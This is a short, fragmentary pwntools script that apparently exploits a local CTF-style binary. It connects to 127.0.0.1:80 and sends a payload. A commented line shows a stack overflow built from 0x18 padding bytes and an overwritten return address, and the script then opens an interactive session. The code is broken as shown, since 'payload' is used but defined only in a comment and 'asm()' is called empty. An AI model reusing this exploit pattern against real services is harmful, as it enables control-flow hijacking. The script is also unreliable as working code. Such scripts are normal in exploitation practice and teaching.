from pwn import *
import struct
p = remote('127.0.0.1',80)
# p = process('/home/srk/Downloads/pwn')

#p.sendline(payload)

#print(p.recvall())
#p.interactive()
# p.sendlineafter('name:\n',b'-1')
# payload = b'a'*(0x18) + p64(0x0400726)
shellcode=asm()
p.sendline(payload)
p.interactive()